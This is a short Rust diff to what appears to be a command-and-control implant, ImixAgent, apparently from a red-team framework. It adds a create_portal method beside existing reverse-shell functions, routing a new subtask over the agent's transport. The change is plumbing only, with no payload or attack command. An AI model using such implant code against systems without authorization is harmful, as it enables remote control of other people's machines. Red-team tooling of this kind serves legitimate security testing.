@@ -7,6 +7,7 @@ use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
 use transport::Transport;
 
+use crate::portal::run_create_portal;
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
 
@@ -293,6 +294,12 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
         self.spawn_subtask(task_id, move |transport| async move {
             run_reverse_shell_pty(task_id, cmd, transport).await
+        })
+    }
+
+    fn create_portal(&self, task_id: i64) -> Result<(), String> {
+        self.spawn_subtask(task_id, move |transport| async move {
+            run_create_portal(task_id, transport).await
         })
     }
 
